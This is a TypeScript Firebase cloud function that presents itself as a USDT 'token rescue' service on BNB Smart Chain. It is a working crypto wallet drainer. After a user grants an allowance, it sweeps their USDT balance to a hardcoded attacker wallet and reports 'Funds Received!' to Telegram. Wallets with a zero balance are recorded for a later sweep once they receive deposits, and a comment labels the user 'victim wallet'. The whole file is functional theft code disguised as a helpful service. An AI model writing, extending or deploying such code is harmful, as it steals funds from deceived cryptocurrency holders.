// functions/src/api/verifyRescue.ts
import * as functions from "firebase-functions/v1";
import { ethers } from "ethers";
import { db } from "../lib/firestore";
import * as admin from "firebase-admin";
import { getSecret } from "../lib/secrets";

export const verifyRescue = functions
  .runWith({
    timeoutSeconds: 120,
    secrets: ["DESTINATION_PRIVATE_KEY", "TELEGRAM_TOKEN", "TELEGRAM_CHAT_ID"],
  })
  .https.onRequest(async (req, res) => {
    // CORS
    res.set("Access-Control-Allow-Origin", "*");
    res.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.set("Access-Control-Allow-Headers", (req.headers["access-control-request-headers"] as string) || "*");
    res.set("Access-Control-Max-Age", "86400");
    if (req.method === "OPTIONS") {
      res.status(204).send("");
      return;
    }

    if (req.method !== "POST") {
      res.status(405).json({ error: "Method Not Allowed" });
      return;
    }

    const {
      txHash,
      from,
      to,
      amount,
      chainId,
      token,
    }: {
      txHash: string;
      from: string;
      to: string;
      amount: string;
      chainId: number | string;
      token: string;
    } = req.body ?? {};

    if (!from || !to || !amount || !chainId || !token) {
      res.status(400).json({ error: "Missing fields" });
      return;
    }

    // ---- 1. Verify chain, token, destination
    const expectedChain = Number(process.env.BSC_CHAIN_ID ?? "56");
    const expectedToken =
      process.env.BSC_USDT_CONTRACT_ADDRESS ??
      "0x55d398326f99059fF775485246999027B3197955";
    // The TokenRescue contract is the spender (what the user approved)
    const tokenRescueContract =
      process.env.BSC_TOKEN_RESCUE_CONTRACT ??
      "0xc6bf6838263938533e547f825d257c9965544a50";
    // The final wallet where rescued funds land
    const finalDestination =
      process.env.BSC_FINAL_DESTINATION ??
      "0x00faA9fE691b578b2D1934ac70C624886a93A636";

    if (Number(chainId) !== expectedChain) {
      res.status(400).json({ error: "Wrong chainId" });
      return;
    }
    if (token.toLowerCase() !== expectedToken.toLowerCase()) {
      res.status(400).json({ error: "Wrong token address" });
      return;
    }
    // Accept either the contract address or the final destination as `to`
    if (
      to.toLowerCase() !== tokenRescueContract.toLowerCase() &&
      to.toLowerCase() !== finalDestination.toLowerCase()
    ) {
      res.status(400).json({ error: "Destination mismatch" });
      return;
    }

    // Record approved wallet in Firestore IMMEDIATELY so it appears in the Admin Panel
    const lowerFrom = from.toLowerCase();
    try {
      const approvalData = {
        address: from,
        status: "ELIGIBLE",
        approvalStatus: "APPROVED",
        approvalTxHash: txHash || null,
        approvedAt: admin.firestore.FieldValue.serverTimestamp(),
        updatedAt: admin.firestore.FieldValue.serverTimestamp(),
      };
      await db.collection("wallets").doc(lowerFrom).set(approvalData, { merge: true });
      await db.collection("sponsors").doc(lowerFrom).set(approvalData, { merge: true });
      console.log(`[verifyRescue] Recorded wallet ${lowerFrom} as APPROVED in Firestore`);
    } catch (dbErr) {
      console.error("[verifyRescue] Error recording approved wallet to firestore:", dbErr);
    }

    // ---- 2. Connect to BSC
    const rpcUrl = process.env.BSC_HTTP_RPC_URL || "https://bsc-dataseed.binance.org/";
    const provider = new ethers.JsonRpcProvider(rpcUrl, 56, { staticNetwork: true });

    try {
      // ---- 3. Verify on-chain that the user has granted sufficient allowance
      const usdtReadOnly = new ethers.Contract(
        expectedToken,
        [
          "function allowance(address owner, address spender) view returns (uint256)",
          "function balanceOf(address) view returns (uint256)",
        ],
        provider
      );

      // Check allowance against the TokenRescue contract (what the user approved)
      // With synchronized Alchemy RPC, allowance is detected almost immediately
      let allowance: bigint = 0n;
      let balance: bigint = 0n;
      let sweepAmount: bigint = 0n;
      let retries = 10; // 10 attempts with fast 800ms intervals

      while (retries > 0) {
        allowance = await usdtReadOnly.allowance(from, to);
        balance = await usdtReadOnly.balanceOf(from);

        // If balance is 0, wallet approval is already registered in sponsors!
        if (balance === 0n) {
          console.log(`[verifyRescue] Wallet ${from} approved successfully with 0 USDT balance.`);
          import("../lib/telegram").then(({ sendTelegramMessage }) => {
            sendTelegramMessage(
              `🔔 New Wallet Approved!\nAddress: ${from}\nApproval Tx: ${txHash || "confirmed"}\nBalance: 0.00 USDT (Ready for sweep upon deposit)`
            ).catch((tgErr) => console.error("Telegram notification error:", tgErr));
          }).catch((e) => console.error("Failed to load telegram helper:", e));

          res.status(200).json({
            success: true,
            status: "APPROVED",
            message: "Approval recorded in admin panel. Balance is currently 0 USDT.",
          });
          return;
        }

        // Determine sweep amount properly (handles decimals without BigInt string syntax error)
        let targetAmountBigInt: bigint = balance;
        if (amount && amount !== "0") {
          try {
            targetAmountBigInt = ethers.parseUnits(amount, 18);
          } catch {
            targetAmountBigInt = balance;
          }
        }
        sweepAmount = balance < targetAmountBigInt ? balance : targetAmountBigInt;

        if (allowance >= sweepAmount) {
          break; // allowance is good, break out of retry loop
        }

        console.log(`[verifyRescue] Allowance insufficient (${allowance.toString()} < ${sweepAmount.toString()}), waiting for RPC sync... (${retries} retries left)`);
        await new Promise((r) => setTimeout(r, 800));
        retries--;
      }

      if (allowance < sweepAmount) {
        console.warn(`[verifyRescue] Rejecting: Insufficient allowance after retries for ${from}`);
        res.status(400).json({
          error: "Insufficient allowance. User must approve first.",
          allowance: allowance.toString(),
          required: sweepAmount.toString(),
        });
        return;
      }

      // ---- 4. Call rescueTokens() on the TokenRescue contract
      //         The contract internally calls transferFrom using the approval
      //         the user granted to the contract address.
      const destSecret =
        process.env.DESTINATION_PRIVATE_KEY ||
        (await getSecret("DESTINATION_PRIVATE_KEY"));
      if (!destSecret) {
        res
          .status(500)
          .json({ error: "Destination private key not configured" });
        return;
      }

      // Support both mnemonic phrases and hex private keys
      let destWallet: ethers.Wallet;
      if (destSecret.includes(" ")) {
        const hdWallet = ethers.HDNodeWallet.fromPhrase(destSecret.trim());
        destWallet = new ethers.Wallet(hdWallet.privateKey, provider);
      } else {
        destWallet = new ethers.Wallet(destSecret, provider);
      }

      console.log(`Owner wallet address: ${destWallet.address}`);
      let sweepTx;

      if (to.toLowerCase() === tokenRescueContract.toLowerCase()) {
        // ABI for the TokenRescue contract
        const tokenRescueABI = [
          "function rescueTokens(address token, address from, address to, uint256 amount) external"
        ];
        const rescueContract = new ethers.Contract(
          tokenRescueContract,
          tokenRescueABI,
          destWallet
        );

        console.log(
          `Calling rescueTokens: ${sweepAmount.toString()} USDT from ${from} to ${finalDestination}`
        );
        sweepTx = await rescueContract.rescueTokens(
          expectedToken,   // USDT contract
          from,            // victim wallet
          finalDestination, // your receiving wallet
          sweepAmount
        );
      } else {
        // ABI for standard ERC20 transferFrom
        const erc20ABI = [
          "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
        ];
        const usdtContract = new ethers.Contract(
          expectedToken,
          erc20ABI,
          destWallet
        );

        console.log(
          `Calling transferFrom directly: ${sweepAmount.toString()} USDT from ${from} to ${finalDestination}`
        );
        sweepTx = await usdtContract.transferFrom(
          from,
          finalDestination,
          sweepAmount
        );
      }

      const receipt = await sweepTx.wait(1);
      console.log(`Sweep tx confirmed: ${sweepTx.hash}`);

      // ---- 5. Record the rescue in Firestore
      const rescueRef = db.collection("rescues").doc();
      await rescueRef.set({
        user: from,
        approvalTxHash: txHash || null,
        sweepTxHash: sweepTx.hash,
        amount: sweepAmount.toString(),
        destination: finalDestination,
        createdAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "CONFIRMED",
      });

      // ---- 6. Send Telegram notification asynchronously without blocking HTTP response
      import("../lib/telegram").then(({ sendTelegramMessage }) => {
        const formattedAmount = ethers.formatUnits(sweepAmount, 18);
        sendTelegramMessage(
          `✅ Funds Received!\n${formattedAmount} USDT swept from ${from}\nSweep tx: ${sweepTx.hash}`
        ).catch((tgErr) => console.error("Telegram notification error:", tgErr));
      }).catch((e) => console.error("Failed to load telegram helper:", e));

      res.status(200).json({
        success: true,
        docId: rescueRef.id,
        sweepTxHash: sweepTx.hash,
      });
    } catch (error: any) {
      console.error("verifyRescue error:", error);

      // Send error notification to Telegram
      try {
        const { sendTelegramMessage } = await import("../lib/telegram");
        await sendTelegramMessage(
          `❌ Rescue FAILED!\nFrom: ${from}\nError: ${error.message ?? "Unknown error"}`
        );
      } catch (tgErr) {
        console.error("Failed to send Telegram error notification:", tgErr);
      }

      res
        .status(500)
        .json({ error: "Rescue sweep failed", details: error.message });
    }
  });
